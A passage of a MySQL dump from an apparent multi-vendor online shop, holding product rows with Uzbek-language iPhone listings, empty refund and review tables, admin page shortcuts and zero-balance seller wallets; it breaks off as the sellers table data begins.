  `status` tinyint(1) NOT NULL DEFAULT 1,
  `featured_status` tinyint(1) NOT NULL DEFAULT 1,
  `meta_title` varchar(191) DEFAULT NULL,
  `meta_description` varchar(191) DEFAULT NULL,
  `meta_image` varchar(191) DEFAULT NULL,
  `request_status` tinyint(1) NOT NULL DEFAULT 0,
  `denied_note` text DEFAULT NULL,
  `shipping_cost` double(8,2) DEFAULT NULL,
  `multiply_qty` tinyint(1) DEFAULT NULL,
  `temp_shipping_cost` double(8,2) DEFAULT NULL,
  `is_shipping_cost_updated` tinyint(1) DEFAULT NULL,
  `code` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
INSERT INTO `products` VALUES
(1,'seller',3,'Test product','test-product-5yNUa1','physical','[{\"id\":\"3\",\"position\":1},{\"id\":\"27\",\"position\":2}]','3','27',NULL,1,'kg',1,1,NULL,'',NULL,'[{\"image_name\":\"2025-07-04-6866e7e4e04fd.webp\",\"storage\":\"public\"},{\"image_name\":\"2025-07-04-6866e7e56d5b4.webp\",\"storage\":\"public\"}]','[{\"color\":\"9ACD32\",\"image_name\":\"2025-07-04-6866e7e4e04fd.webp\",\"storage\":\"public\"},{\"color\":null,\"image_name\":\"2025-07-04-6866e7e56d5b4.webp\",\"storage\":\"public\"}]','2025-07-04-6866e7e5cd59a.webp','public','','public',NULL,NULL,'youtube',NULL,'[\"#9ACD32\"]',0,'null','[]','[{\"type\":\"YellowGreen\",\"price\":0,\"sku\":null,\"qty\":0}]','[]','[]',0,12000,0,'0','percent','include','100','flat',0,1,'<p>salom</p>',0,NULL,'2025-07-04 01:28:21','2025-07-04 01:29:51',1,1,'Test product','salom',NULL,1,NULL,0.00,0,NULL,NULL,'SCQ45L'),
(2,'seller',3,'Iphone 14','iphone-14-KI8FK7','physical','[{\"id\":\"2\",\"position\":1}]','2',NULL,NULL,2,'kg',1,1,NULL,'',NULL,'[{\"image_name\":\"2025-07-04-6866f75e5f9c7.webp\",\"storage\":\"public\"},{\"image_name\":\"2025-07-04-6866f75eb8315.webp\",\"storage\":\"public\"}]','[{\"color\":\"9ACD32\",\"image_name\":\"2025-07-04-6866f75e5f9c7.webp\",\"storage\":\"public\"},{\"color\":\"FFFF00\",\"image_name\":\"2025-07-04-6866f75eb8315.webp\",\"storage\":\"public\"}]','2025-07-04-6866f75fe9f0b.webp','public','','public',NULL,NULL,'youtube',NULL,'[\"#9ACD32\",\"#FFFF00\"]',0,'null','[]','[{\"type\":\"YellowGreen\",\"price\":0,\"sku\":null,\"qty\":0},{\"type\":\"Yellow\",\"price\":0,\"sku\":null,\"qty\":0}]','[]','[]',0,100,0,'0','percent','include','10','flat',0,1,'<p>256/GB<br>qora</p><p><br></p><p>...</p>',0,NULL,'2025-07-04 02:34:23','2025-07-04 02:34:40',1,1,'Iphone 14','256/GBqora...',NULL,1,NULL,0.00,0,NULL,NULL,'3MGBKT'),
(3,'seller',2,'Smartfon iPhone 16 Pro/Pro Max, 128/256 GB, 1-SIM/dual SIM, g\'ilof sovg\'aga','smartfon-iphone-16-propro-max-128256-gb-1-simdual-sim-gilof-sovgaga-6nRGuP','physical','[{\"id\":\"1\",\"position\":1},{\"id\":\"19\",\"position\":2}]','1','19',NULL,2,'kg',1,1,NULL,'',NULL,'[{\"image_name\":\"2025-07-07-686b9d556e402.webp\",\"storage\":\"public\"},{\"image_name\":\"2025-07-07-686b9d55de7ce.webp\",\"storage\":\"public\"},{\"image_name\":\"2025-07-07-686b9d56476df.webp\",\"storage\":\"public\"},{\"image_name\":\"2025-07-07-686b9d568f823.webp\",\"storage\":\"public\"}]','[{\"color\":\"FFFF00\",\"image_name\":\"2025-07-07-686b9d556e402.webp\",\"storage\":\"public\"},{\"color\":\"FFFFFF\",\"image_name\":\"2025-07-07-686b9d55de7ce.webp\",\"storage\":\"public\"},{\"color\":\"000000\",\"image_name\":\"2025-07-07-686b9d56476df.webp\",\"storage\":\"public\"},{\"color\":null,\"image_name\":\"2025-07-07-686b9d568f823.webp\",\"storage\":\"public\"}]','2025-07-07-686b9d56ce1fd.webp','public','','public',NULL,NULL,'youtube','https://www.youtube.com/watch?v=gcG3jiuYWOE&pp=ygUPaXBob25lIDE2IGFiem9y','[\"#FFFF00\",\"#FFFFFF\",\"#000000\"]',0,'null','[]','[{\"type\":\"Yellow\",\"price\":200,\"sku\":\"Si1PM1G1Sgs-Yellow\",\"qty\":4},{\"type\":\"White\",\"price\":400,\"sku\":\"Si1PM1G1Sgs-White\",\"qty\":2},{\"type\":\"Black\",\"price\":100,\"sku\":\"Si1PM1G1Sgs-Black\",\"qty\":10}]','[]','[]',0,100,0,'0','percent','exclude','10','flat',16,1,'<p><span class=\"BodyMRegular-Long product-tabs-content tab-content editor\" data-test-id=\"block__tab-content\" data-v-e848732a=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: normal; margin: 0px; padding: 0px; vertical-align: baseline; font-family: Inter, serif; font-weight: 400; letter-spacing: normal; text-decoration: none; line-height: 20px; color: rgb(0, 0, 0); font-variant-ligatures: normal; font-variant-caps: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255);\"><div data-v-e848732a=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 0.875rem; font-style: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: rgb(31, 32, 38); font-weight: 400; white-space: pre-wrap; word-break: break-word; background-color: transparent !important;\"></div></span></p><div class=\"info-container\" data-v-e848732a=\"\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 16px; font-style: normal; margin: 0px; padding: 0px; vertical-align: baseline; color: rgb(0, 0, 0); font-family: &quot;Times New Roman&quot;; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;\"><div class=\"BodyMRegular short-description\" data-test-id=\"block__characteristics\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px; padding: 0px; vertical-align: baseline; line-height: 18px; font-family: Inter, serif; font-weight: 400; letter-spacing: 0px; text-decoration: none; color: rgb(31, 32, 38);\"><ul class=\"list\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 16px; padding: 0px 0px 0px 16px; vertical-align: baseline; list-style: disc; display: grid; grid-template-columns: 1fr 1fr; row-gap: 10px;\"><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">SIM kartalar soni Dual - nano SIM + eSim</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">Kamera: 48 MP ultra keng telefoto 4K , 120 fps</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">Zaryadlovchi ulagich turi - USB-C</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">Zaryadlash funktsiyalari - simsiz zaryadlash, tez zaryadlash</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">O\'rnatilgan xotira - 128/256 GB / OS versiyasi-iOS 17</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">IMEI 1 - rasmiy ro\'yxatdan o\'tgan (ro\'yxatdan o\'tishni faollashtirish 30 kun ichida avtomatik tarzda amalga oshiriladi)</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">Display: Pro Max 6.9\" (2868 x 1320), 4K / Pro 6.3\" (2622 x 1206)</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\">Kafolat: 12 oy</li><li class=\"item\" data-test-id=\"text__attribute\" data-v-1703e6e9=\"\" style=\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\"><h2 style=\"border: 0px; outline: none; font-size: 1.625rem; font-style: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; vertical-align: baseline; color: rgb(31, 32, 38); font-weight: 500; white-space-collapse: preserve; word-break: break-word; background-color: transparent !important;\">iPhone&nbsp;16 Pro / 16 Pro Max</h2><p style=\"border: 0px; outline: none; font-size: 0.875rem; font-style: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; vertical-align: baseline; white-space-collapse: preserve; word-break: break-word; background-color: transparent !important;\"><br style=\"border: 0px; outline: 0px; word-break: break-word; margin-top: 0px;\"></p></li></ul></div></div>',0,NULL,'2025-07-07 15:11:34','2025-07-11 23:00:22',1,1,'Smartfon iPhone 16 Pro/Pro Max, 128/256 GB, 1-SIM/dual SIM, g\'ilof sovg\'aga','SIM kartalar soni Dual - nano SIM + eSimKamera: 48 MP ultra keng telefoto 4K , 120 fpsZaryadlovchi ulagich turi - USB-CZaryadlash funktsiyalari - simsiz zaryadl',NULL,1,NULL,0.00,0,NULL,NULL,'W1EXXT');
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `publishing_houses`
--

DROP TABLE IF EXISTS `publishing_houses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `publishing_houses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `publishing_houses`
--

LOCK TABLES `publishing_houses` WRITE;
/*!40000 ALTER TABLE `publishing_houses` DISABLE KEYS */;
/*!40000 ALTER TABLE `publishing_houses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `refund_requests`
--

DROP TABLE IF EXISTS `refund_requests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `refund_requests` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_details_id` bigint(20) unsigned NOT NULL,
  `customer_id` bigint(20) unsigned NOT NULL,
  `status` varchar(191) NOT NULL,
  `approved_count` tinyint(4) NOT NULL DEFAULT 0,
  `denied_count` tinyint(4) NOT NULL DEFAULT 0,
  `amount` double(8,2) NOT NULL,
  `product_id` bigint(20) unsigned NOT NULL,
  `order_id` bigint(20) unsigned NOT NULL,
  `refund_reason` longtext NOT NULL,
  `images` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `approved_note` longtext DEFAULT NULL,
  `rejected_note` longtext DEFAULT NULL,
  `payment_info` longtext DEFAULT NULL,
  `change_by` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `refund_requests`
--

LOCK TABLES `refund_requests` WRITE;
/*!40000 ALTER TABLE `refund_requests` DISABLE KEYS */;
/*!40000 ALTER TABLE `refund_requests` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `refund_statuses`
--

DROP TABLE IF EXISTS `refund_statuses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `refund_statuses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `refund_request_id` bigint(20) unsigned DEFAULT NULL,
  `change_by` varchar(191) DEFAULT NULL,
  `change_by_id` bigint(20) unsigned DEFAULT NULL,
  `status` varchar(191) DEFAULT NULL,
  `message` longtext DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `refund_statuses`
--

LOCK TABLES `refund_statuses` WRITE;
/*!40000 ALTER TABLE `refund_statuses` DISABLE KEYS */;
/*!40000 ALTER TABLE `refund_statuses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `refund_transactions`
--

DROP TABLE IF EXISTS `refund_transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `refund_transactions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) unsigned DEFAULT NULL,
  `payment_for` varchar(191) DEFAULT NULL,
  `payer_id` bigint(20) unsigned DEFAULT NULL,
  `payment_receiver_id` bigint(20) unsigned DEFAULT NULL,
  `paid_by` varchar(191) DEFAULT NULL,
  `paid_to` varchar(191) DEFAULT NULL,
  `payment_method` varchar(191) DEFAULT NULL,
  `payment_status` varchar(191) DEFAULT NULL,
  `amount` double(8,2) DEFAULT NULL,
  `transaction_type` varchar(191) DEFAULT NULL,
  `order_details_id` bigint(20) unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `refund_id` bigint(20) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `refund_transactions`
--

LOCK TABLES `refund_transactions` WRITE;
/*!40000 ALTER TABLE `refund_transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `refund_transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `restock_product_customers`
--

DROP TABLE IF EXISTS `restock_product_customers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `restock_product_customers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `restock_product_id` int(11) NOT NULL,
  `customer_id` int(11) DEFAULT NULL,
  `variant` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `restock_product_customers`
--

LOCK TABLES `restock_product_customers` WRITE;
/*!40000 ALTER TABLE `restock_product_customers` DISABLE KEYS */;
INSERT INTO `restock_product_customers` VALUES
(1,1,3,'YellowGreen','2025-07-11 22:44:42','2025-07-11 22:44:42');
/*!40000 ALTER TABLE `restock_product_customers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `restock_products`
--

DROP TABLE IF EXISTS `restock_products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `restock_products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `variant` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `restock_products`
--

LOCK TABLES `restock_products` WRITE;
/*!40000 ALTER TABLE `restock_products` DISABLE KEYS */;
INSERT INTO `restock_products` VALUES
(1,2,'YellowGreen','2025-07-11 22:44:42','2025-07-11 22:44:42');
/*!40000 ALTER TABLE `restock_products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `review_replies`
--

DROP TABLE IF EXISTS `review_replies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `review_replies` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `review_id` int(11) NOT NULL,
  `added_by_id` int(11) DEFAULT NULL,
  `added_by` varchar(255) NOT NULL COMMENT 'customer, seller, admin, deliveryman',
  `reply_text` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `review_replies`
--

LOCK TABLES `review_replies` WRITE;
/*!40000 ALTER TABLE `review_replies` DISABLE KEYS */;
/*!40000 ALTER TABLE `review_replies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reviews`
--

DROP TABLE IF EXISTS `reviews`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `reviews` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) NOT NULL,
  `customer_id` bigint(20) NOT NULL,
  `delivery_man_id` bigint(20) DEFAULT NULL,
  `order_id` bigint(20) DEFAULT NULL,
  `comment` mediumtext DEFAULT NULL,
  `attachment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`attachment`)),
  `rating` int(11) NOT NULL DEFAULT 0,
  `status` int(11) NOT NULL DEFAULT 1,
  `is_saved` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reviews`
--

LOCK TABLES `reviews` WRITE;
/*!40000 ALTER TABLE `reviews` DISABLE KEYS */;
/*!40000 ALTER TABLE `reviews` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `robots_meta_contents`
--

DROP TABLE IF EXISTS `robots_meta_contents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `robots_meta_contents` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `page_title` varchar(255) DEFAULT NULL,
  `page_name` varchar(255) DEFAULT NULL,
  `page_url` varchar(255) DEFAULT NULL,
  `meta_title` varchar(255) DEFAULT NULL,
  `meta_description` text DEFAULT NULL,
  `meta_image` varchar(255) DEFAULT NULL,
  `canonicals_url` varchar(255) DEFAULT NULL,
  `index` varchar(255) DEFAULT NULL,
  `no_follow` varchar(255) DEFAULT NULL,
  `no_image_index` varchar(255) DEFAULT NULL,
  `no_archive` varchar(255) DEFAULT NULL,
  `no_snippet` varchar(255) DEFAULT NULL,
  `max_snippet` varchar(255) DEFAULT NULL,
  `max_snippet_value` varchar(255) DEFAULT NULL,
  `max_video_preview` varchar(255) DEFAULT NULL,
  `max_video_preview_value` varchar(255) DEFAULT NULL,
  `max_image_preview` varchar(255) DEFAULT NULL,
  `max_image_preview_value` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `robots_meta_contents`
--

LOCK TABLES `robots_meta_contents` WRITE;
/*!40000 ALTER TABLE `robots_meta_contents` DISABLE KEYS */;
/*!40000 ALTER TABLE `robots_meta_contents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `search_functions`
--

DROP TABLE IF EXISTS `search_functions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `search_functions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(150) DEFAULT NULL,
  `url` varchar(250) DEFAULT NULL,
  `visible_for` varchar(191) NOT NULL DEFAULT 'admin',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `search_functions`
--

LOCK TABLES `search_functions` WRITE;
/*!40000 ALTER TABLE `search_functions` DISABLE KEYS */;
INSERT INTO `search_functions` VALUES
(1,'Dashboard','admin/dashboard','admin',NULL,NULL),
(2,'Order All','admin/orders/list/all','admin',NULL,NULL),
(3,'Order Pending','admin/orders/list/pending','admin',NULL,NULL),
(4,'Order Processed','admin/orders/list/processed','admin',NULL,NULL),
(5,'Order Delivered','admin/orders/list/delivered','admin',NULL,NULL),
(6,'Order Returned','admin/orders/list/returned','admin',NULL,NULL),
(7,'Order Failed','admin/orders/list/failed','admin',NULL,NULL),
(8,'Brand Add','admin/brand/add-new','admin',NULL,NULL),
(9,'Brand List','admin/brand/list','admin',NULL,NULL),
(10,'Banner','admin/banner/list','admin',NULL,NULL),
(11,'Category','admin/category/view','admin',NULL,NULL),
(12,'Sub Category','admin/category/sub-category/view','admin',NULL,NULL),
(13,'Sub sub category','admin/category/sub-sub-category/view','admin',NULL,NULL),
(14,'Attribute','admin/attribute/view','admin',NULL,NULL),
(15,'Product','admin/product/list','admin',NULL,NULL),
(16,'Promotion','admin/coupon/add-new','admin',NULL,NULL),
(17,'Custom Role','admin/custom-role/create','admin',NULL,NULL),
(18,'Employee','admin/employee/add-new','admin',NULL,NULL),
(19,'Seller','admin/sellers/seller-list','admin',NULL,NULL),
(20,'Contacts','admin/contact/list','admin',NULL,NULL),
(21,'Flash Deal','admin/deal/flash','admin',NULL,NULL),
(22,'Deal of the day','admin/deal/day','admin',NULL,NULL),
(23,'Language','admin/business-settings/language','admin',NULL,NULL),
(24,'Mail','admin/business-settings/mail','admin',NULL,NULL),
(25,'Shipping method','admin/business-settings/shipping-method/add','admin',NULL,NULL),
(26,'Currency','admin/currency/view','admin',NULL,NULL),
(27,'Payment method','admin/business-settings/payment-method','admin',NULL,NULL),
(28,'SMS Gateway','admin/business-settings/sms-gateway','admin',NULL,NULL),
(29,'Support Ticket','admin/support-ticket/view','admin',NULL,NULL),
(30,'FAQ','admin/helpTopic/list','admin',NULL,NULL),
(31,'About Us','admin/business-settings/about-us','admin',NULL,NULL),
(32,'Terms and Conditions','admin/business-settings/terms-condition','admin',NULL,NULL),
(33,'Web Config','admin/business-settings/web-config','admin',NULL,NULL);
/*!40000 ALTER TABLE `search_functions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `seller_wallet_histories`
--

DROP TABLE IF EXISTS `seller_wallet_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `seller_wallet_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) DEFAULT NULL,
  `amount` double NOT NULL DEFAULT 0,
  `order_id` bigint(20) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `payment` varchar(191) NOT NULL DEFAULT 'received',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `seller_wallet_histories`
--

LOCK TABLES `seller_wallet_histories` WRITE;
/*!40000 ALTER TABLE `seller_wallet_histories` DISABLE KEYS */;
/*!40000 ALTER TABLE `seller_wallet_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `seller_wallets`
--

DROP TABLE IF EXISTS `seller_wallets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `seller_wallets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) DEFAULT NULL,
  `total_earning` double NOT NULL DEFAULT 0,
  `withdrawn` double NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `commission_given` double(8,2) NOT NULL DEFAULT 0.00,
  `pending_withdraw` double(8,2) NOT NULL DEFAULT 0.00,
  `delivery_charge_earned` double(8,2) NOT NULL DEFAULT 0.00,
  `collected_cash` double(8,2) NOT NULL DEFAULT 0.00,
  `total_tax_collected` double(8,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `seller_wallets`
--

LOCK TABLES `seller_wallets` WRITE;
/*!40000 ALTER TABLE `seller_wallets` DISABLE KEYS */;
INSERT INTO `seller_wallets` VALUES
(1,1,0,0,'2025-06-24 09:21:50','2025-06-24 09:21:50',0.00,0.00,0.00,0.00,0.00),
(2,2,0,0,'2025-06-29 12:36:33','2025-06-29 12:36:33',0.00,0.00,0.00,0.00,0.00),
(3,3,0,0,'2025-06-29 12:42:15','2025-06-29 12:42:15',0.00,0.00,0.00,0.00,0.00);
/*!40000 ALTER TABLE `seller_wallets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sellers`
--

DROP TABLE IF EXISTS `sellers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `sellers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `f_name` varchar(30) DEFAULT NULL,
  `l_name` varchar(30) DEFAULT NULL,
  `phone` varchar(25) DEFAULT NULL,
  `image` varchar(30) NOT NULL DEFAULT 'def.png',
  `email` varchar(80) NOT NULL,
  `password` varchar(80) DEFAULT NULL,
  `status` varchar(15) NOT NULL DEFAULT 'pending',
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `bank_name` varchar(191) DEFAULT NULL,
  `branch` varchar(191) DEFAULT NULL,
  `account_no` varchar(191) DEFAULT NULL,
  `holder_name` varchar(191) DEFAULT NULL,
  `auth_token` text DEFAULT NULL,
  `sales_commission_percentage` double(8,2) DEFAULT NULL,
  `gst` varchar(191) DEFAULT NULL,
  `cm_firebase_token` varchar(191) DEFAULT NULL,
  `pos_status` tinyint(1) NOT NULL DEFAULT 0,
  `minimum_order_amount` double(8,2) NOT NULL DEFAULT 0.00,
  `free_delivery_status` int(11) NOT NULL DEFAULT 0,
  `free_delivery_over_amount` double(8,2) NOT NULL DEFAULT 0.00,
  `app_language` varchar(191) NOT NULL DEFAULT 'en',
  PRIMARY KEY (`id`),
  UNIQUE KEY `sellers_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sellers`
--

LOCK TABLES `sellers` WRITE;
/*!40000 ALTER TABLE `sellers` DISABLE KEYS */;
INSERT INTO `sellers` VALUES
